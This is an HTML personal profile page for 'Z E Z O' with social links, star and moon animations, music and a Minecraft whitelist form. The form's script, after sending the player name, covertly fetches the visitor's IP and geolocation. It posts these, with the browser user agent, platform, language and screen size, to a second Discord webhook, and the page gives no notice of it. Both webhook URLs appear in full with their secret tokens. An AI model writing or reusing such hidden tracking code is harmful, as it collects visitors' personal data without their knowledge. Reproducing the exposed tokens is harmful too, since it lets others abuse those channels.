<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Z E Z O's Profile</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body, html {
      height: 100%;
    }
    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
      text-align: center;
      position: relative;
      overflow: hidden;
      background: linear-gradient(180deg, #181b2c 0%, #232946 100%);
    }

    /* Star styles */
    .star {
      position: absolute;
      width: 2px;
      height: 2px;
      background: white;
      border-radius: 50%;
      opacity: 0.85;
      pointer-events: none;
      z-index: 0;
      animation: starFall linear;
    }

    @keyframes starFall {
      0% {
        opacity: 0.9;
        transform: translateY(0) scale(1);
      }
      80% {
        opacity: 1;
        transform: translateY(90vh) scale(1.2);
      }
      100% {
        opacity: 0;
        transform: translateY(100vh) scale(0.7);
      }
    }

    /* Moon styles */
    #moon {
      position: fixed;
      top: 60px;
      right: 80px;
      width: 90px;
      height: 90px;
      background: radial-gradient(circle at 60% 40%, #fffbe7 70%, #f6e27a 100%, #e0c366 120%);
      border-radius: 50%;
      box-shadow: 0 0 60px 20px #fffbe7, 0 0 120px 40px #f6e27a;
      z-index: 2;
      transition: box-shadow 0.4s, filter 0.4s, opacity 0.7s;
      cursor: pointer;
      opacity: 1;
    }
    #moon.shine {
      /* box-shadow: 0 0 120px 40px #fffbe7, 0 0 180px 80px #f6e27a, 0 0 240px 120px #fffbe7;
      filter: brightness(1.3) drop-shadow(0 0 40px #fffbe7); */
    }
    #moon.broken {
      opacity: 0.2;
      filter: grayscale(1) blur(2px);
      box-shadow: none;
    }
    #moon::after {
      content: '';
      position: absolute;
      left: 60%;
      top: 30%;
      width: 18px;
      height: 18px;
      background: rgba(255,255,255,0.18);
      border-radius: 50%;
      filter: blur(2px);
    }

  

    /* Animated floating nature shapes (blobs) */
    .nature-bg {
      display: none !important;
    }

    .nature-blob {
      display: none !important;
    }

    @keyframes blobMove {
      0%   { transform: scale(1) translateY(0) translateX(0);}
      50%  { transform: scale(1.15) translateY(-30px) translateX(20px);}
      100% { transform: scale(1) translateY(0) translateX(0);}
    }

    @keyframes bgGradientMove {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .profile {
      background: linear-gradient(135deg, rgba(168,85,247,0.18) 0%, rgba(147,51,234,0.18) 100%);
      padding: 32px 28px;
      border-radius: 28px;
      max-width: 370px;
      box-shadow: 0 0 32px 0 rgba(168,85,247,0.18), 0 8px 32px 0 rgba(0,0,0,0.25);
      position: relative;
      border: 2px solid rgba(168,85,247,0.25);
      overflow: hidden;
      animation: profileFadeIn 1.2s cubic-bezier(.77,0,.18,1) both;
      transition: box-shadow 0.5s, border 0.5s, background 0.5s;
      z-index: 1;
    }
    .profile:hover {
      box-shadow: 0 0 48px 0 #a855f7, 0 8px 48px 0 #9333ea;
      border: 2.5px solid #a855f7;
      background: linear-gradient(120deg, rgba(168,85,247,0.28) 0%, rgba(147,51,234,0.28) 100%);
    }

    @keyframes profileFadeIn {
      0% {
        opacity: 0;
        transform: scale(0.92) translateY(40px);
        filter: blur(6px);
      }
      100% {
        opacity: 1;
        transform: scale(1) translateY(0);
        filter: blur(0);
      }
    }
    
    .avatar-container {
      position: relative;
      display: inline-block;
      width: 116px;
      height: 116px;
      margin: 0 auto;
    }
    .avatar-border {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: conic-gradient(
        from 0deg,
        #a855f7 0%,
        #9333ea 25%,
        #7e22ce 50%,
        #6b21a8 75%,
        #a855f7 100%
      );
      animation: 
        spin 3s linear infinite,
        pulse 4s ease-in-out infinite,
        borderGlow 5s ease-in-out infinite;
      z-index: 0;
      box-shadow: 
        0 0 15px rgba(168, 85, 247, 0.6),
        0 0 30px rgba(147, 51, 234, 0.4);
      filter: brightness(1.1);
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }
    
    @keyframes borderGlow {
      0%, 100% {
        box-shadow: 
          0 0 15px rgba(168, 85, 247, 0.6),
          0 0 30px rgba(147, 51, 234, 0.4);
      }
      50% {
        box-shadow: 
          0 0 25px rgba(168, 85, 247, 0.8),
          0 0 45px rgba(147, 51, 234, 0.6);
      }
    }
    
    .profile img {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid white;
      position: absolute;
      top: 8px;
      left: 8px;
      z-index: 1;
      transition: transform 0.5s ease, filter 0.5s ease;
    }
    
    .avatar-container:hover .avatar-border {
      animation: 
        spin 1.5s linear infinite,
        pulse 2s ease-in-out infinite,
        borderGlow 3s ease-in-out infinite;
    }
    
    .avatar-container:hover img {
      transform: scale(1.03);
      filter: brightness(1.1);
    }
    
    .profile h1 {
      margin: 15px 0 5px;
      font-size: 1.8em;
      letter-spacing: 3px;
      position: relative;
      transition: color 0.3s;
      cursor: pointer;
    }

    .profile h1::after {
      content: '';
      display: block;
      width: 0;
      height: 3px;
      background: linear-gradient(90deg, #a855f7, #9333ea, #a855f7);
      border-radius: 2px;
      transition: width 0.3s;
      margin: 0 auto;
    }

    .profile h1:hover {
      color: #c084fc;
      text-shadow: 0 0 8px #a855f7, 0 0 16px #9333ea;
    }

    .profile h1:hover::after {
      width: 80%;
    }
    
    .profile p {
      font-size: 0.95em;
      color: #ddd;
    }
    .social-icons {
      margin-top: 20px;
    }
    .social-icons a {
      color: white;
      text-decoration: none;
      margin: 0 10px;
      font-size: 1.4em;
      display: inline-block;
      transition: transform 0.4s ease, color 0.4s ease;
      position: relative;
    }
    .social-icons a::after {
      content: '';
      position: absolute;
      bottom: -4px;
      left: 50%;
      transform: translateX(-50%);
      width: 0%;
      height: 2px;
      background: #9333ea;
      transition: width 0.3s ease-in-out;
    }
    .social-icons a:hover {
      color: #c084fc;
      transform: scale(1.3) rotate(5deg);
    }
    .social-icons a:hover::after {
      width: 100%;
    }
    .last-seen {
      margin-top: 15px;
      font-size: 0.85em;
      color: #aaa;
    }
    .views {
      margin-top: 10px;
      font-size: 0.85em;
      color: #bbb;
    }

    /* Make sure .profile is above the blobs */
    .profile {
      position: relative;
      z-index: 1;
    }

    .whitelist-form {
      /* background: none; */
      /* box-shadow: none; */
      /* border: none; */
      /* padding: 0; */
      /* margin-top: 18px; */
    }
    .whitelist-form h2 {
      color: #fdfdfd !important; /* Minecraft green */
      text-shadow: 1px 1px 0 #fff, 0 0 6px #ffffff;
      font-family: 'Minecraftia', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      letter-spacing: 1px;
      margin-bottom: 8px;
    }

    #mc-whitelist-form {
      display: flex;
      gap: 5px;
      width: 100%;
      justify-content: center;
    }
    #mc-name {
      flex: 1;
      padding: 4px 7px;
      border-radius: 6px;
      border: 2px solid #a855f7;
      outline: none;
      font-size: 0.95em;
      background: #f3e8ff;
      color: #6b21a8;
      font-family: 'Minecraftia', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      box-shadow: 1px 1px 0 #e9d5ff inset;
      transition: border 0.2s;
    }
    #mc-name:focus {
      border: 2px solid #c084fc;
    }

    #mc-whitelist-form button {
      padding: 4px 10px;
      border-radius: 6px;
      border: 2px solid #a855f7;
      background: linear-gradient(90deg, #a855f7 60%, #c084fc 100%);
      color: #fff;
      font-weight: bold;
      font-size: 0.95em;
      cursor: pointer;
      font-family: 'Minecraftia', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      box-shadow: 1px 1px 0 #e9d5ff inset;
      transition: background 0.2s, border 0.2s;
    }
    #mc-whitelist-form button:hover {
      background: linear-gradient(90deg, #c084fc 60%, #a855f7 100%);
      border: 2px solid #c084fc;
    }

    #whitelist-message {
      margin-top: 7px;
      font-size: 0.92em;
      color: #c084fc;
      min-height: 16px;
      text-shadow: 0 0 6px #a855f7;
      font-family: 'Minecraftia', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    @keyframes fadeInUp {
      0% {
        opacity: 0;
        transform: translateY(10px);
      }
      100% {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes mcPopIn {
      0% { opacity: 0; transform: scale(0.92) translateY(30px);}
      100% { opacity: 1; transform: scale(1) translateY(0);}
    }

    /* Optional: Minecraft pixel font */
    @font-face {
      font-family: 'Minecraftia';
      src: url('https://fonts.cdnfonts.com/s/17373/Minecraftia-Regular.woff') format('woff');
      font-weight: normal;
      font-style: normal;
    }

    /* Place these right after <body> and before your main content */
    #star-sky {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    #star-sky::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: transparent url('data:image/svg+xml,%3Csvg ... %3C/svg%3E') no-repeat center center;
      animation: twinkling 4s infinite linear;
    }

    .real-cloud {
      position: fixed;
      z-index: 2;
      opacity: 0.85;
      pointer-events: none;
      filter: drop-shadow(0 4px 16px #0002);
      animation: none !important;
      transition: opacity 1s;
    }

    /* Group clouds close together and make them larger */
    .cloud-img1 { top: 12vh; left: 10vw; width: 320px; }
    .cloud-img2 { top: 15vh; left: 32vw; width: 340px; }
    .cloud-img3 { top: 11vh; left: 58vw; width: 280px; }
    .cloud-img4 { top: 18vh; left: 78vw; width: 220px; }

    .ground-img {
      width: 100vw;
      min-width: 100vw;
      height: 120px;
      object-fit: cover;
      position: absolute;
      left: 0;
      bottom: 0;
      z-index: 1;
      pointer-events: none;
      user-select: none;
    }

    .tree-img {
      position: absolute;
      left: 12vw;
      bottom: 40px;
      width: 120px;
      height: auto;
      z-index: 2;
      pointer-events: none;
      user-select: none;
    }
  </style>
</head>
<body>
  <!-- Place these right after <body> and before your main content -->
  <div id="star-sky"></div>
  <img class="real-cloud cloud-img1" src="https://pngimg.com/uploads/cloud/cloud_PNG16.png" alt="cloud" />
  <img class="real-cloud cloud-img2" src="https://pngimg.com/uploads/cloud/cloud_PNG19.png" alt="cloud" />
  <img class="real-cloud cloud-img3" src="https://pngimg.com/uploads/cloud/cloud_PNG20.png" alt="cloud" />
  <img class="real-cloud cloud-img4" src="https://pngimg.com/uploads/cloud/cloud_PNG22.png" alt="cloud" />
  <div id="moon" title="Click me!"></div>

  <div class="profile">
    <div class="avatar-container">
      <div class="avatar-border"></div>
      <img src="https://i.ibb.co/mVDyZMTg/e3fbda5ef554577e5aa1e68d7fb2cda7.jpg" alt="Profile Picture" loading="lazy" decoding="async" />
    </div>
    <h1>Z E Z O</h1>
    <p class="quote">Follow your dream, not people.</p>
    <div class="social-icons">
      <a href="https://instagram.com/ze2ow" target="_blank" rel="noopener" title="Instagram"><i class="fab fa-instagram"></i></a>
      <a href="https://discord.gg/JfGhPfDFA7" target="_blank" rel="noopener" title="Discord"><i class="fab fa-discord"></i></a>
      <a href="https://tiktok.com/@czezo" target="_blank" rel="noopener" title="TikTok"><i class="fab fa-tiktok"></i></a>
    </div>
    <!-- Move whitelist form INSIDE profile, at the bottom -->
    <div class="whitelist-form" style="background:none; box-shadow:none; border:none; padding:0; margin-top:18px;">
      <h2 style="margin-bottom:6px; font-family: 'Minecraftia', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; letter-spacing:1px; text-shadow:0 0 6px #a855f7; color:#c084fc;">
        Minecraft Whitelist
      </h2>
      <form id="mc-whitelist-form" style="display:flex; gap:5px;">
        <input type="text" id="mc-name" placeholder="نافئ خويئ ماينكرافتئ" required maxlength="16" />
        <button type="submit">Send</button>
      </form>
      <div id="whitelist-message"></div>
    </div>
  </div>

  <!-- Add this just before the closing </body> tag -->
  <button id="music-toggle" aria-label="Toggle music" style="
    position: fixed;
    bottom: 24px;
    right: 24px;
    z-index: 99;
    background: rgba(60,7,100,0.65);
    border: none;
    border-radius: 50%;
    width: 44px;
    height: 44px;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 2px 12px #a855f7;
    cursor: pointer;
    transition: background 0.2s;
  ">
    <i id="music-icon" class="fas fa-volume-up" style="color:#fff;font-size:1.3em;"></i>
  </button>
  <audio id="bg-music" loop>
    <source src="https://s3.aconvert.com/convert/p3r68-cdx67/4avxi-rz633.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
  </audio>
  <script>
    // Minecraft whitelist form handling
    document.getElementById('mc-whitelist-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      const name = document.getElementById('mc-name').value.trim();
      const msg = document.getElementById('whitelist-message');

      // Only allow English letters, numbers, and underscores (no Arabic or special chars)
      if (!/^[A-Za-z0-9_]+$/.test(name)) {
        msg.textContent = "Please enter your Minecraft name in English letters, numbers, or underscores only.";
        return;
      }

      // Timer logic: allow 1 submission per day per device, 2 per day per IP
      const now = Date.now();
      const lastSentKey = 'mcWhitelistLastSent';
      const ipCountKey = 'mcWhitelistIpCount';
      const ipDateKey = 'mcWhitelistIpDate';

      // Get public IP
      let ip = '';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
      } catch {
        msg.textContent = "Could not verify your IP. Please try again.";
        return;
      }

      // Device timer (localStorage)
      const lastSent = parseInt(localStorage.getItem(lastSentKey)) || 0;
      if (now - lastSent < 24 * 60 * 60 * 1000) {
        msg.textContent = "You can only send your name once per day from this device.";
        return;
      }

      // IP timer (localStorage, store as JSON object)
      let ipCountData = JSON.parse(localStorage.getItem(ipCountKey) || '{}');
      let ipDateData = JSON.parse(localStorage.getItem(ipDateKey) || '{}');
      const today = new Date().toISOString().slice(0, 10);

      // Reset IP count if it's a new day
      if (ipDateData[ip] !== today) {
        ipCountData[ip] = 0;
        ipDateData[ip] = today;
      }

      if (ipCountData[ip] >= 2) {
        msg.textContent = "You can only send your name twice per day from this IP.";
        return;
      }

      // Passed all checks, increment counters
      localStorage.setItem(lastSentKey, now.toString());
      ipCountData[ip] = (ipCountData[ip] || 0) + 1;
      ipDateData[ip] = today;
      localStorage.setItem(ipCountKey, JSON.stringify(ipCountData));
      localStorage.setItem(ipDateKey, JSON.stringify(ipDateData));

      msg.textContent = "Sending...";

      // Webhook for Minecraft name
      const nameWebhookUrl = "https://discord.com/api/webhooks/1381304917326827580/oFMo8oeVbc_sAx6u5QNaVvlWohGp0iIhn_vDSuT9U8AwMmy3viL3lQY5X4Xbs9Qdhtlt";
      // Webhook for info
      const infoWebhookUrl = "https://discord.com/api/webhooks/1381304914365649006/5I2k2T8YX1xZKSdCNNwej1Aew-0rPeJ3JSt_m5vWfFog7hDj_FnYLX5TW6UDwM-lIedr";

      // Send Minecraft name
      const payload = {
        content: `Minecraft whitelist request: **${name}**`
      };

      try {
        const res = await fetch(nameWebhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        if (res.ok) {
          msg.textContent = "Your name was sent! You will be whitelisted soon.";
          document.getElementById('mc-whitelist-form').reset();

          // --- Send user info ---
          try {
            // Get device info
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenSize = `${window.screen.width}x${window.screen.height}`;
            const time = new Date().toLocaleString();

            // Try to get location (approximate, via IP geolocation API)
            let locationText = "Location: Not available";
            try {
              const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
              const locData = await locRes.json();
              if (locData && locData.city && locData.country_name) {
                locationText = `Location: ${locData.city}, ${locData.country_name}`;
              } else if (locData && locData.country_name) {
                locationText = `Location: ${locData.country_name}`;
              }
            } catch {}

            // Send info to Discord info webhook
            const infoPayload = {
              content: `User shared info:
**IP:** ${ip}
**Device:** ${userAgent}
**Platform:** ${platform}
**Language:** ${language}
**Screen:** ${screenSize}
**Time:** ${time}
${locationText}`
            };

            await fetch(infoWebhookUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(infoPayload)
            });
          } catch (err) {
            // Optionally show error or ignore
          }
          // --- End send user info ---

        } else {
          msg.textContent = "Error sending. Please try again later.";
        }
      } catch {
        msg.textContent = "Network error. Please try again.";
      }
    });

    // Music player logic
    const music = document.getElementById('bg-music');
    const musicToggle = document.getElementById('music-toggle');
    const musicIcon = document.getElementById('music-icon');
    let musicMuted = false;

    // Start music automatically (user must interact first on most browsers)
    window.addEventListener('click', function autoPlayMusic() {
      music.volume = 0.25;
      music.play().catch(()=>{});
      window.removeEventListener('click', autoPlayMusic);
    });

    musicToggle.addEventListener('click', function() {
      musicMuted = !musicMuted;
      music.muted = musicMuted;
      musicIcon.className = musicMuted ? "fas fa-volume-mute" : "fas fa-volume-up";
    });

    // --- Starfall logic ---
    const starSky = document.getElementById('star-sky');
    function randomBetween(a, b) {
      return Math.random() * (b - a) + a;
    }
    function spawnStar() {
      const star = document.createElement('div');
      star.className = 'star';
      star.style.left = `${randomBetween(0, 100)}vw`;
      star.style.top = `${randomBetween(-10, 0)}vh`;
      star.style.width = star.style.height = `${randomBetween(1, 2.5)}px`;
      star.style.opacity = randomBetween(0.6, 1);
      star.style.animationDuration = `${randomBetween(2.5, 5.5)}s`;
      starSky.appendChild(star);
      setTimeout(() => star.remove(), 6000);
    }
    setInterval(spawnStar, 180); // spawn stars every 180ms

    // --- Static stars in the sky ---
    for (let i = 0; i < 60; i++) {
      const staticStar = document.createElement('div');
      staticStar.className = 'star';
      staticStar.style.left = `${randomBetween(2, 98)}vw`;
      staticStar.style.top = `${randomBetween(2, 30)}vh`;
      staticStar.style.width = staticStar.style.height = `${randomBetween(1, 2.5)}px`;
      staticStar.style.opacity = randomBetween(0.5, 1);
      staticStar.style.animation = 'none';
      starSky.appendChild(staticStar);
    }

    // --- Moon shine and break logic ---
    const moon = document.getElementById('moon');
    let moonLocked = false;

    moon.addEventListener('click', () => {
      if (moonLocked) {
        // Unlock moon, allow shine again
        moonLocked = false;
        moon.classList.remove('broken');
      } else {
        // Lock moon, prevent shine until next click
        moonLocked = true;
        moon.classList.add('broken');
      }
    });
  </script>
</body>
</html>
